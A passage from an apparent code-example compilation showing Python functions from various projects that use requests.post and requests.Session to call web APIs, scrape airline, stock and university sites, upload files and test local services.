    data ='searchCond={"tripType":"OW","adtCount":1,"chdCount":0,"infCount":0,"currency":"CNY","sortType":"a","segmentList":[{"deptCd":"'+from_h+'","arrCd":"'+to_h+'","deptDt":"'+date_h+'","deptCdTxt":"'+i_orgcity+'","arrCdTxt":"'+i_dstCity+'","deptCityCode":"'+from_h+'","arrCityCode":"'+to_h+'"}],"sortExec":"a","page":"0"}'
    try:
        resp1 = requests.post(url,data = data,headers = headers,timeout = 15)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
# 解析数据 
**************************************
def post_annotation(annotation, api_key):
    ''' Takes annotation dict and api_key string'''
    base_url = 'https://api.circonus.com/v2'
    anootate_post_endpoint = '/annotation'
    resp = requests.post(base_url + anootate_post_endpoint,
                         headers=build_headers(api_key), data=json.dumps(annotation))
    resp.raise_for_status()
    return resp 
**************************************
def import_file(xapi, module, ip_address, file_, category):
    xapi.keygen()

    params = {
        'type': 'import',
        'category': category,
        'key': xapi.api_key
    }

    filename = os.path.basename(file_)

    mef = requests_toolbelt.MultipartEncoder(
        fields={
            'file': (filename, open(file_, 'rb'), 'application/octet-stream')
        }
    )

    r = requests.post(
        'https://' + ip_address + '/api/',
        verify=False,
        params=params,
        headers={'Content-Type': mef.content_type},
        data=mef
    )

    # if something goes wrong just raise an exception
    r.raise_for_status()

    resp = xml.etree.ElementTree.fromstring(r.content)

    if resp.attrib['status'] == 'error':
        module.fail_json(msg=r.content)

    return True, filename 
**************************************
def getGlucoseDex():
	# Get most recent glucose from Dexcom Share
	# Code adapted from the Share to Nightscout bridge, via @bewest and @shanselman
	# https://github.com/bewest/share2nightscout-bridge
	# Login and get a Dexcom Share session ID
	# ... need to only do this once and then refresh the sessionID as necessary
	dexLoginURL = "https://share1.dexcom.com/ShareWebServices/Services/General/LoginPublisherAccountByName"
	dexLoginPayload = {
            "User-Agent": "Dexcom Share/3.0.2.11 CFNetwork/711.2.23 Darwin/14.0.0",
            "applicationId": "d89443d2-327c-4a6f-89e5-496bbb0317db",
            "accountName": dexUsername,
            "password": dexPassword,
        }
	dexLoginHeaders = {
	    'content-type': "application/json",
	    'accept': "application/json",
	    }
	dexLoginResponse = requests.post(dexLoginURL, json=dexLoginPayload, headers=dexLoginHeaders)
	sessionID = dexLoginResponse.json()
	# Use the session ID to retrieve the latest glucose record
	dexGlucoseURL = "https://share1.dexcom.com/ShareWebServices/Services/Publisher/ReadPublisherLatestGlucoseValues"
	dexGlucoseQueryString = {"sessionID":sessionID,"minutes":"1440","maxCount":"1"}
	dexGlucoseHeaders = {
	    'content-type': "application/json",
	    'accept': "application/json",
	    }
	dexGlucoseResponse = requests.post(dexGlucoseURL, headers=dexGlucoseHeaders, params=dexGlucoseQueryString)
	dexGlucoseResponseJSON = dexGlucoseResponse.json()
	dexGlucose = dexGlucoseResponseJSON[0]["Value"]
	dexGlucoseEpochString = dexGlucoseResponseJSON[0]["ST"]
	dexGlucoseEpoch = int(re.match('/Date\((\d+)\)/', dexGlucoseEpochString).group(1))/1e3
	dexGlucoseTimestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(dexGlucoseEpoch))
	print("Current Glucose (Share):      " + str(dexGlucose) + " " + glucoseUnit + " at " + time.strftime("%-I:%M:%S %p on %A, %B %d, %Y",time.localtime(dexGlucoseEpoch)))
	return dexGlucose 
**************************************
def factory_list(token, body = dict(misc.CRF_BODY)):
    '''(str [, dict]) ->  list of dict
    token: "Token" value in the .auth.fj_login(username, password) dict
    body: search parameters in the format of .misc.CRF_BODY

    returns a list of robots per the request parameters'''

    url = r'https://factory.robocraftgame.com/api/roboShopItems/list'
    headers = misc.make_headers(token)
    response = requests.post(url, json=body, headers=headers)
    return response.json()['response']['roboShopItems'] 
**************************************
def getNote(self,gid, commentLimit, likeLimit):
        header = {
            "Content-Type" : "application/json",
            "X-Line-Mid" : self.mid,
            "x-lct": self.channel_access_token,

        }
        r = requests.get(
            "http://" + self.host + "/mh/api/v27/post/list.json?homeId=" + gid + "&commentLimit=" + commentLimit + "&sourceType=TALKROOM&likeLimit=" + likeLimit,
            headers = header
        )
        return r.json() 
**************************************
def getHome(self,mid):
        header = {
                    "Content-Type": "application/json",
                    "User-Agent" : self.UA,
                    "X-Line-Mid" : self.mid,
                    "x-lct" : self.channel_access_token,
        }

        r = requests.get(
        "http://" + self.host + "/mh/api/v27/post/list.json?homeId=" + mid + "&commentLimit=2&sourceType=LINE_PROFILE_COVER&likeLimit=6",
        headers = header
        )
        return r.json() 
**************************************
def main():
   # credentials
   dfcreds = get_credentials(keyfile) # get the authentication information from the keyfile
   headers = {'content-type': 'application/json', 'HLIAMKey': dfcreds['key']}
   
   # Viewable Communities
   rViewableCommunities = requests.get(repo_path + 'api/v2.0/Communities/GetViewableCommunities', headers=headers)
   dfViewableCommunities = pd.read_json(rViewableCommunities.content)

   # Community Members
   payload = {
           "CommunityKey": 'd06df790-8ca4-4e54-91a0-244af0228ddc',
           "StartRecord": 1,
           "EndRecord": 1500
           }
   rCommunityMembers = requests.post(repo_path + 'api/v2.0/Communities/GetCommunityMembers', headers=headers, json=payload)
   dfCommunityMembers = pd.read_json(rCommunityMembers.content)
   # add a timestamp to the data
   dfCommunityMembers['cmtimestamp'] = dt.datetime.now()
   dfCommunityMembers.index.names = ['rowUID']
   dfCommunityMembers.drop('Community', 1, inplace=True) #remove the nested dictionary of community information
   dfCommunityMembers.to_csv(file_path + 'techsup_hl_communitymembers.csv', index=False, date_format="%Y-%m-%d")

   # Discussion Posts
   rDiscussionPosts = requests.get(repo_path + 'api/v2.0/Discussions/GetDiscussionPosts?maxToRetrieve=5000', headers=headers)
   dfDiscussionPosts = pd.read_json(rDiscussionPosts.content)
   # add a timestamp to the data
   dfDiscussionPosts['dptimestamp'] = dt.datetime.now()
   dfDiscussionPosts.to_csv(file_path + 'techsup_hl_discussionposts.csv', index=False, date_format="%Y-%m-%d") 
**************************************
def send_to_rapidpro(msg = {}):
    '''sends a given message to the RapidPro server'''

    try:
        #if there is a keyword in the message, just remove it before forwarding to RapidPro
        keyword = KANNEL_SERVERS[msg['host']]['keyword']
        logger.debug("The server %s use the keyword %s", msg['host'], keyword)

        if keyword is not None:
            text = msg['text'].split()
            if text[0].upper() == keyword.upper(): #match using the same case
                logger.debug("Removing keyword %s from the message %s", keyword, msg['text'])
                msg['text'] = " ".join(text[1:]) #remove the keyword from the message and reconstruct the SMS

        url = RAPIDPRO_URLS['RECEIVED']

        data = { #the data to be sent in the body of the request
                'from'  : msg['from'],
                'text'  : msg['text'],
        }
        r = post(url=url, data = data)
        logger.debug("Sending request to RapidPro server at %s", r.url)
        logger.debug("Data inside request to RapidPro server is %s", r.request.body)
        logger.debug("The response we got from RapidPro is %s", r.text)

        r.raise_for_status() #Will raise an exception with the HTTP code ONLY IF the HTTP status was NOT 200
        return True
    except Exception as e:
        logger.debug("Exception %s occurred", e)
        raise e 
**************************************
def upload_file(self, filetosubmit, vmprofile=1):
        '''
        Description: Upload procedure, uploads a file to the ATD server for inspection
        Input:
                 filetosubmit:  Path to the file to be submitted
                 vmProfileList: ATD Profile ID for inspection

        Output:      Two possible values:

                 (0, error_info): Unsucessful procedure
                 (1, {'jobID':'xxx','taskId':'xxx','file':'xxx','md5':'xxx','size':'xxx':'mimeType':'xxx'}): Sucessful upload
        '''

        url = 'https://%s/php/fileupload.php' % self.atdserver

        payload = {"data": {"vmProfileList": vmprofile, "submitType": 0}, "amas_filename": self.get_filename(filetosubmit)}

        data = json.dumps(payload)

        try:
            files = {'amas_filename': (self.get_filename(filetosubmit), open(filetosubmit, 'rb'))}
        except Exception as e:
            error_info = 'Upload method: Error opening file: %s' % e
            return(0, error_info)

        custom_header = {
            'Accept': 'application/vnd.ve.v1.0+json',
            'VE-SDK-API': '%s' % self.b64(self.session, self.userId),
            'accept-encoding': 'gzip;q=0,deflate,sdch'
        }

        try:
            r = requests.post(url, headers=custom_header, files=files, data={'data': data}, verify=False)

        except Exception as e:
            error_info = 'Error submitting file to ATD:\n%s' % e
            return(0, error_info)

        if r.status_code == 200:
            server_info = json.loads(r.content)
            if server_info['success'] is True:
                info = {
                    'jobId': server_info['subId'],
                    'taskId': server_info['results'][0]['taskId'],
                    'file': server_info['results'][0]['file'],
                    'md5': server_info['results'][0]['md5'],
                    'size': server_info['results'][0]['size'],
                    'mimeType': server_info['mimeType']
                }
                return (1, info)
            else:
                error_info = 'Upload operation did not return a success value'
                return (0, error_info)
        else:
            error_info = 'Error uploading file, bad credentials or header - status code: %d' % r.status_code
            return (0, error_info) 
**************************************
def _get_data(self):
        conf = get_config()
        try:
            res = requests.post('https://www.yr.no/place/%s/%s/%s/forecast.xml'
                                % (conf['api']['yrno']['country'], conf['api']['yrno']['province'], conf['api']['yrno']['city']))
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.post('https://www.yr.no/place/%s/%s/%s/forecast.xml'
                                % (conf['api']['yrno']['country'], conf['api']['yrno']['province'], conf['api']['yrno']['city']))
        res.raise_for_status()
        root = ET.fromstring(res.text)

        # filter data and parse to weather dict
        legal_xml = root.find('credit').find('link')
        location_xml = root.find('location')
        sun_xml = root.find('sun')
        weather_data = {
            'credit': {
                "text": legal_xml.get('text'),
                "url": legal_xml.get('url')
            },
            'city': location_xml.find('name').text,
            'country': location_xml.find('country').text,
            'lastUpdate': time.strptime(root.find('meta').find('lastupdate').text, time_format_str),
            'sun': {
                "rise": time.strptime(sun_xml.get('rise'), time_format_str),
                "set": time.strptime(sun_xml.get('set'), time_format_str)
            },
            "forecast": []
        }
        tabular_xml = root.find('forecast').find('tabular')
        for time_xml in tabular_xml.findall('time'):
            symbol_xml = time_xml.find('symbol')
            wind_xml = time_xml.find('windSpeed')
            weather_data['forecast'].append({
                'time': {
                    "from": time.strptime(time_xml.get('from'), time_format_str),
                    "to": time.strptime(time_xml.get('to'), time_format_str)
                },
                'symbol': {
                    "id": symbol_xml.get('number'),
                    "description": symbol_xml.get('name')
                },
                'precipitation': time_xml.find('precipitation').get('value'),
                'wind': {
                    "direction": time_xml.find('windDirection').get('code'),
                    "mps": wind_xml.get('mps'),
                    "description": wind_xml.get('name')
                },
                "celsius": time_xml.find('temperature').get('value')
            })

        logger.info("retrieved data: %s" % weather_data)
        self.data = weather_data 
**************************************
def upload_file(body, fileName, contentType, contentLength):

    # 1. GET FILE STORAGE URI
    fileUploadPartsResponse = requests.post(fileUploadRequestURI, 
        headers={
            'Authorization': iotHubSasToken,
            'Content-Type': 'application/json'
        },
        data = '{ "blobName": "%s"}' % (fileName)
    )

    print(fileUploadRequestURI)
    print(fileUploadPartsResponse.status_code)
    print(fileUploadPartsResponse.text)

    if fileUploadPartsResponse.status_code == 200:
 
        fileUploadParts = fileUploadPartsResponse.json()
        fileUploadURI = fileUploadURITemplate % (fileUploadParts["hostName"], fileUploadParts["containerName"], fileUploadParts["blobName"], fileUploadParts["sasToken"])
        
        # 2. UPLOAD FILE TO BLOB STORAGE
        uploadResponse = requests.put(fileUploadURI, 
            headers={
                'Content-Type': contentType,
                'Content-Length': contentLength,
                'x-ms-blob-type': 'BlockBlob',
                
            },
            data = body
        )

        print(fileUploadURI)
        print(uploadResponse.status_code)
        print(uploadResponse.text)
        
        if uploadResponse.status_code == 201:

            # 3. GET UPLOAD FILE NOTIFICATION
            notificationResponse = requests.post(notificationURI, 
                headers={
                    'Authorization': iotHubSasToken,
                    'Content-Type': 'application/json'
                },
                data = '{"correlationId": "%s" }' % (fileUploadParts["correlationId"])
            )
    
            print(notificationURI)
            print(notificationResponse.status_code)
            print(notificationResponse.text) 
**************************************
def make_api_call(method, url, token, payload = None, parameters = None):
    # Send these headers with all API calls
    headers = { 'User-Agent' : 'django-tutorial/1.0',
                'Authorization' : 'Bearer {0}'.format(token),
                'Accept' : 'application/json'}

    # Use these headers to instrument calls. Makes it easier
    # to correlate requests and responses in case of problems
    # and is a recommended best practice.
    request_id = str(uuid.uuid4())
    instrumentation = { 'client-request-id' : request_id,
                        'return-client-request-id' : 'true' }

    headers.update(instrumentation)

    response = None 

    payload = {
              "Subject": "Discuss the Calendar REST API",
              "Body": {
                "ContentType": "HTML",
                "Content": "I think it will meet our requirements!"
              },
              "Start": {
                  "DateTime": "2014-04-04T18:00:00",
                  "TimeZone": "Pacific Standard Time"
              },
              "End": {
                  "DateTime": "2014-04-04T19:00:00",
                  "TimeZone": "Pacific Standard Time"
              },
              "Attendees": [
                {
                  "EmailAddress": {
                    "Address": "[email protected]",
                    "Name": "Janet Schorr"
                  },
                  "Type": "Required"
                }
              ]
            }

    if (method.upper() == 'GET'):
        response = requests.get(url, headers = headers, params = parameters)
    elif (method.upper() == 'DELETE'):
        response = requests.delete(url, headers = headers, params = parameters)
    elif (method.upper() == 'PATCH'):
        headers.update({ 'Content-Type' : 'application/json' })
        response = requests.patch(url, headers = headers, data = json.dumps(payload), params = parameters)
    elif (method.upper() == 'POST'):
        headers.update({ 'Content-Type' : 'application/json' })
        response = requests.post(url, headers = headers, data = json.dumps(payload), params = parameters)

    return response 
**************************************
def test_binary_classifier(self):
        from keras.wrappers.scikit_learn import KerasClassifier
        from sklearn.pipeline import Pipeline
        from sklearn.datasets import load_breast_cancer
        from sklearn import preprocessing
        from pandas import DataFrame
        from numpy import array
        from os import system
        from pandas import read_json
        from requests import post

        breast_cancer = load_breast_cancer()
        input_df = DataFrame(data=breast_cancer['data'], columns=breast_cancer['feature_names'])
        model = Pipeline([
            ('rescale', preprocessing.StandardScaler()),
            ('min_max', preprocessing.MinMaxScaler((-1, 1,))),
            ('nn', KerasClassifier(build_fn=self.create_binary_classification_model, epochs=1, verbose=1)),
        ])
        X, Y = input_df.values, array(breast_cancer['target'])
        model.fit(X, Y)

        # convert classifier to Docker container
        from sklearn2docker.constructor import Sklearn2Docker
        s2d = Sklearn2Docker(
            classifier=model,
            feature_names=list(input_df),
            class_names=breast_cancer['target_names'].tolist(),
        )
        s2d.save(
            name="classifier",
            tag="keras",
        )

        # # run your Docker container as a detached process
        system("docker run -d -p {}:5000 --name {} classifier:keras && sleep 5".format(self.port, self.container_name))

        # send your training data as a json string
        request = post("http://localhost:{}/predict/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(len(list(result)), 1)
        self.assertEqual(len(result), len(input_df))

        request = post("http://localhost:{}/predict_proba/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(len(list(result)), 1)
        self.assertEqual(len(result), len(input_df)) 
**************************************
def test_categorical_classifier(self):
        from keras.wrappers.scikit_learn import KerasClassifier
        from sklearn.pipeline import Pipeline
        from sklearn.datasets import load_iris
        from sklearn import preprocessing
        from pandas import DataFrame
        from numpy import array
        from os import system
        from pandas import read_json
        from requests import post

        iris = load_iris()
        input_df = DataFrame(data=iris['data'], columns=iris['feature_names'])
        model = Pipeline([
            ('rescale', preprocessing.StandardScaler()),
            ('min_max', preprocessing.MinMaxScaler((-1, 1,))),
            ('nn', KerasClassifier(build_fn=self.create_categorical_classification_model, epochs=1, verbose=1)),
        ])
        X, Y = input_df.values, array(iris['target'])
        model.fit(X, Y)

        # convert classifier to Docker container
        from sklearn2docker.constructor import Sklearn2Docker
        s2d = Sklearn2Docker(
            classifier=model,
            feature_names=list(input_df),
            class_names=iris['target_names'].tolist(),
        )
        s2d.save(
            name="classifier",
            tag="keras",
        )

        # # run your Docker container as a detached process
        system("docker run -d -p {}:5000 --name {} classifier:keras && sleep 5".format(self.port, self.container_name))

        # send your training data as a json string
        request = post("http://localhost:{}/predict/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(len(list(result)), 1)
        self.assertEqual(len(result), len(input_df))

        request = post("http://localhost:{}/predict_proba/split".format(self.port), json=input_df.to_json(orient="split"))
        result = read_json(request.content.decode(), orient="split")
        self.assertEqual(len(list(result)), 3)
        self.assertEqual(len(result), len(input_df)) 
**************************************
def get_course_by_aao(self, semester):
        # 如果还没有登录新教务处则登录
        if self.aao_cookies == None:
            self.__aao_login()
        post_data = {
            'ignoreHead': '1',
            'showPrintAndExport': '1',
            'setting.kind': 'std',
            'startWeek': '',
            'project.id': '1',
            'semester.id': semester,
            'ids': '46600'
        }

        course_data = requests.post("http://219.216.96.4/eams/courseTableForStd!courseTable.action",
                                    data=post_data,
                                    headers=self.__headers,
                                    cookies=self.aao_cookies,
                                    proxies=proxies['aao'])
        teachers = re.findall('var teachers = \[{id:.*?,name:"(.*?)",lab:false}\];', course_data.text)
        course_names = re.findall('actTeacherName.join\(\',\'\),".*?","(.*?)"', course_data.text)
        course_classroom = re.findall('actTeacherName.join\(\',\'\),".*?",".*?",".*?","(.*?)"', course_data.text)
        course_weeks_str = re.findall('actTeacherName.join\(\',\'\),".*?",".*?",".*?",".*?","(.*?)"', course_data.text)
        course_class = re.findall('activity = new TaskActivity([\s\S]*?)var teachers', course_data.text)
        course_class = course_class + re.findall('activity = new TaskActivity([\s\S]*?)table0.marshalTable',
                                                 course_data.text)
        course_info = re.findall(
            '<td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>[\s\S]*?<a href=".*?" onclick=".*?" title="点击显示单个教学任务具体安排">.*?</a>[\s\S]*?</td><td>(.*?)</td><td>',
            course_data.text)

        for count in range(0, len(course_class)):
            day = re.findall('index =(\d+)\*unitCount\+\d+', course_class[count])
            class_num = re.findall('index =\d+\*unitCount\+(\d+)', course_class[count])
            this_course = []
            for cour in range(0, len(day)):
                this_course.append({'day': int(day[cour]), 'class_num': int(class_num[cour])})
            course_class[count] = this_course

        res = [
            {
                'teacher': teachers[i],
                'name': course_names[i],
                'classroom': course_classroom[i],
                'weeks': self.__week_num(course_weeks_str[i]),
                'time': course_class[i]
            }
            for i in range(0, len(teachers))
        ]
        info = [
            {
                'course_code': i[0],
                'course_name': i[1],
                'course_score': i[2],
                'course_teacher': i[3]
            }
            for i in course_info
        ]

        return {'table': res, 'info': info}

    # 获取校园卡消费记录 
**************************************
def get_card_trade(self, start, end):
        # 如果还没有通过一网通办获取到一卡通的cookies，则获取
        if self.card_cookies == False:
            self.__card_login()
        trade_url = 'http://ecard.neu.edu.cn/selfsearch/User/ConsumeInfo.aspx'
        page = 1
        res = []
        query_page = requests.get('http://ecard.neu.edu.cn/selfsearch/User/ConsumeInfo.aspx',
                                  cookies=self.card_cookies,
                                  proxies=proxies['card'])
        while True:
            data = {
                '__EVENTTARGET': 'ctl00$ContentPlaceHolder1$AspNetPager1',
                '__EVENTARGUMENT': str(page),
                '__VIEWSTATE':
                    re.findall('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"[\s\S]*?value="(.*?)"',
                               query_page.text)[0],
                '__EVENTVALIDATION':
                    re.findall('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />',
                               query_page.text)[0],
                'ctl00$ContentPlaceHolder1$rbtnType': '0',
                'ctl00$ContentPlaceHolder1$txtStartDate': start,
                'ctl00$ContentPlaceHolder1$txtEndDate': end,
            }

            if page == 1:
                data['ctl00$ContentPlaceHolder1$btnSearch'] = '查  询'
                data['__EVENTARGUMENT'] = ''

            query_page = requests.post(trade_url, data=data,
                                       cookies=self.card_cookies,
                                       headers=self.__headers,
                                       proxies=proxies['card'])
            page_num = re.findall('style="margin-right:5px;">(\d+)</a>', query_page.text)
            trade_time = re.findall('<span id="Content.*?">(.*?)</span>', query_page.text)
            trades = re.findall(
                '</td><td>(.*?)</td><td align="right">(.*?)</td><td align="right">(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td>',
                query_page.text)
            for i in range(0, len(trade_time)):
                if (trade_time[i] == ''):
                    break
                append_content = {
                    'trade_time': trade_time[i],
                    'trade_type': trades[i][0],
                    'trade_cost': trades[i][1],
                    'remaind': trades[i][2],
                    'salesman': trades[i][3],
                    'place': trades[i][4],
                    'terminal': trades[i][5]
                }
                res.append(append_content)
            if 1 - (str(page + 1) in page_num):
                break
            page += 1
        return res

    # 门禁记录，start与end格式为都如2019-05-18这样 
**************************************
def sendSignedPostRequest(self, uri, postData):
        signature = hmac.new(self.secret, msg=uri+postData, digestmod=hashlib.sha512).digest().encode("hex")
        r = requests.post(self.endpoint + uri, headers={"X-Signature": signature}, data=postData)
        #print r, r.text, r.json()
        return r.json() 
**************************************
def createAlbum2(self,gid,name,path,oid):
        header = {
                    "Content-Type": "application/json",
                    "User-Agent" : self.UA,
                    "X-Line-Mid" : self.mid,
                    "x-lct" : self.channel_access_token,
        }
        payload = {
                "type" : "image",
                "title" : name
        }
        r = requests.post(
            "http://" + self.host + "/mh/album/v3/album?count=1&auto=0&homeId=" + gid,
            headers = header,
            data = json.dumps(payload)
        )
        #albumId = r.json()["result"]["items"][0]["id"]


        #h = {
        #            "Content-Type": "application/x-www-form-urlencoded",
        #            "User-Agent" : self.UA,
        #            "X-Line-Mid" : gid,
        #            "X-Line-Album" : albumId,
        #            "x-lct" : self.channel_access_token,
                    #"x-obs-host" : "obs-jp.line-apps.com:443",

        #}
        #print r.json()
        #files = {
        #    'file': open(path, 'rb'),
        #}
        #p = {
        #    "userid" : gid,
        #    "type" : "image",
        #    "oid" : oid,
        #    "ver" : "1.0"
        #}
        #data = {
        #    'params': json.dumps(p)
        #}
        #r = requests.post(
        #"http://obs-jp.line-apps.com/oa/album/a/object_info.nhn:443",
        #headers = h,
        #data = data,
        #files = files
        #)
        return r.json()
        #cl.createAlbum("cea9d61ba824e937aaf91637991ac934b","ss3ai","kawamuki.png") 

Python requests.Session() Examples

**************************************
def requests_retry_session(
    retries=3,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None,
):
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session 
**************************************
def data_Crawling(from_h,to_h,date_h):
    s = requests.Session()
    dates = date_h.split('-')
    year = dates[0]
    month =  dates[1]
    day =  dates[2]
    try:
        resp =s.get('http://et.airchina.com.cn/InternetBooking/AirLowFareSearchExternal.do?&tripType=OW&searchType=FARE&flexibleSearch=false&directFlightsOnly=false&fareOptions=1.FAR.X&outboundOption.originLocationCode='+from_h+'&outboundOption.destinationLocationCode='+to_h+'&outboundOption.departureDay='+day+'&outboundOption.departureMonth='+month+'&outboundOption.departureYear='+year+'&outboundOption.departureTime=NA&guestTypes%5B0%5D.type=ADT&guestTypes%5B0%5D.amount=1&guestTypes%5B1%5D.type=CNN&guestTypes%5B1%5D.amount=0&pos=AIRCHINA_CN&lang=zh_CN&guestTypes%5B2%5D.type=INF&guestTypes%5B2%5D.amount=0',headers=h1,timeout=60)
        resp2 = s.post('http://et.airchina.com.cn/InternetBooking/AirLowFareSearchExt.do?ajaxAction=true',headers=h1,timeout=60)
        resp1 = s.get('http://et.airchina.com.cn/InternetBooking/AirFareFamiliesFlexibleForward.do',headers=h1,timeout=60)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2

# 解析数据 
**************************************
def __init__(self, url, mutual_auth, cert=None, verify='true', **kwargs):

        self._logger = logging.getLogger("SPOT.INGEST.HDFS_client")
        session = Session()

        if verify == 'true':
            self._logger.info('SSL verification enabled')
            session.verify = True
            if cert is not None:
                self._logger.info('SSL Cert: ' + cert)
                if ',' in cert:
                    session.cert = [path.strip() for path in cert.split(',')]
                else:
                    session.cert = cert
        elif verify == 'false':
            session.verify = False

        super(SecureKerberosClient, self).__init__(url, mutual_auth, session=session, **kwargs) 
**************************************
def __init__(self, url, mutual_auth, cert=None, verify='true', **kwargs):

        self._logger = logging.getLogger("SPOT.INGEST.HDFS_client")
        session = Session()

        if verify == 'true':
            self._logger.info('SSL verification enabled')
            session.verify = True
            if cert is not None:
                self._logger.info('SSL Cert: ' + cert)
                if ',' in cert:
                    session.cert = [path.strip() for path in cert.split(',')]
                else:
                    session.cert = cert
        elif verify == 'false':
            session.verify = False

        super(SecureKerberosClient, self).__init__(url, mutual_auth, session=session, **kwargs) 
**************************************
def __init__(self, user_agent, token_url_template, platform):
        self.user_agent = user_agent
        self.token_url_template = token_url_template
        self.platform = platform

        self.session = requests.Session()
        self.session.cookies = http.cookiejar.LWPCookieJar()
        if not os.path.exists(COOKIE_FILE):
            self.session.cookies.save(COOKIE_FILE)
        self.session.cookies.load(COOKIE_FILE, ignore_discard=True)
        self.session.headers = {"User-agent": user_agent}
        if os.path.exists(SESSION_FILE):
            self.load()
        else:
            self._state = {
                'api_key': None,
                'client_api_key': None,
                'token': None,
                'access_token': None,
                'access_token_expiry': None
            }
        self.login() 
**************************************
def __init__(self, **kwargs):
        super(XueQiuClient, self).__init__()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
            'Host': 'xueqiu.com',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip,deflate,sdch',
            'Cache-Control': 'no-cache',
            'Referer': 'http://xueqiu.com/P/ZH003694',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'zh-CN,zh;q=0.8'
        }
        self.session = requests.Session()
        self.session.headers.update(headers)
        self.account_config = None
        self.config.update({
            "create_cubes_url": "https://xueqiu.com/cubes/create.json",
            "get_token_url": "https://xueqiu.com/service/csrf",
            "get_cubes_list": "https://xueqiu.com/v4/stock/portfolio/stocks.json",
            "get_cubes_detail": "https://xueqiu.com/cubes/quote.json",
        }) 
**************************************
def __init__(self, scheme='http', marker=None, timeout=None):
        self.logger = logging.getLogger(__name__)
        self.__session = requests.Session()

        self.set_auth()

        self.marker = marker
        self.__session.headers.update({'X-Context-Marker': marker})

        self.prom_url = self._get_prom_url()
        self.port = self.prom_url.port
        self.host = self.prom_url.hostname
        self.scheme = scheme

        if self.port:
            self.base_url = "%s://%s:%s/api/" % (self.scheme, self.host,
                                                 self.port)
        else:
            # assume default port for scheme
            self.base_url = "%s://%s/api/" % (self.scheme, self.host)

        self.default_timeout = self._calc_timeout_tuple((20, 30), timeout) 
**************************************
def test_port_mapping_single_port(self):
        env_name = self._env_name()
        proj_name, py_version = 'test-proj', '3.7'

        proj_dir = self._create_project_dir(proj_name)
        self._commander.run(
            f'create --name={env_name} --version={py_version} {str(proj_dir)}')
        with self._commander.active_env(env_name) as env:
            os.chdir(proj_dir)

            port = 8000
            out = self._commander.run(
                f'run -d -p {port} -- python -m http.server {port}', env=env)
            self.assertCommandOk(out)
            self.assertPortMapperExists(env_name, port)

            s = requests.Session()
            s.mount('http://', HTTPAdapter(
                max_retries=Retry(connect=3, backoff_factor=1)))
            r = s.get(f'http://localhost:{port}')

            self.assertEqual(r.status_code, 200, msg=r.content) 
**************************************
def test_port_mapping_multi_ports(self):
        env_name = self._env_name()
        proj_name, py_version = 'test-proj', '3.7'

        proj_dir = self._create_project_dir(proj_name)
        self._commander.run(
            f'create --name={env_name} --version={py_version} {str(proj_dir)}')
        with self._commander.active_env(env_name) as env:
            os.chdir(proj_dir)

            for port in range(8000, 8003):
                out = self._commander.run(
                    f'run -d -p {port} -- python -m http.server {port}',
                    env=env
                )
                self.assertCommandOk(out)
                self.assertPortMapperExists(env_name, port)

                s = requests.Session()
                s.mount('http://', HTTPAdapter(
                    max_retries=Retry(connect=3, backoff_factor=1)))
                r = s.get(f'http://localhost:{port}')

                self.assertEqual(r.status_code, 200, msg=r.content) 
**************************************
def requests_retry_session(
    retries=3,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None,
):
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session 
**************************************
def get_raw(stocks) -> dict:
    req = requests.Session()
    req.get(SESSION_URL, proxies=get_proxies())

    r = req.get(
        STOCKINFO_URL.format(
            stock_id=_join_stock_id(stocks),
            time=int(time.time()) * 1000))

    if sys.version_info < (3, 5):
        try:
            return r.json()
        except ValueError:
            return {'rtmessage': 'json decode error', 'rtcode': '5000'}
    else:
        try:
            return r.json()
        except json.decoder.JSONDecodeError:
            return {'rtmessage': 'json decode error', 'rtcode': '5000'} 
**************************************
def data_Crawling(from_h,to_h,date_h):
    s = requests.Session()
    dates = date_h.split('-')
    year = dates[0]
    month =  dates[1]
    day =  dates[2]
    try:
        resp =s.get('http://et.airchina.com.cn/InternetBooking/AirLowFareSearchExternal.do?&tripType=OW&searchType=FARE&flexibleSearch=false&directFlightsOnly=false&fareOptions=1.FAR.X&outboundOption.originLocationCode='+from_h+'&outboundOption.destinationLocationCode='+to_h+'&outboundOption.departureDay='+day+'&outboundOption.departureMonth='+month+'&outboundOption.departureYear='+year+'&outboundOption.departureTime=NA&guestTypes%5B0%5D.type=ADT&guestTypes%5B0%5D.amount=1&guestTypes%5B1%5D.type=CNN&guestTypes%5B1%5D.amount=0&pos=AIRCHINA_CN&lang=zh_CN&guestTypes%5B2%5D.type=INF&guestTypes%5B2%5D.amount=0',headers=h1,timeout=60)
        resp2 = s.post('http://et.airchina.com.cn/InternetBooking/AirLowFareSearchExt.do?ajaxAction=true',headers=h1,timeout=60)
        resp1 = s.get('http://et.airchina.com.cn/InternetBooking/AirFareFamiliesFlexibleForward.do',headers=h1,timeout=60)
        return resp1.text,resp1.status_code
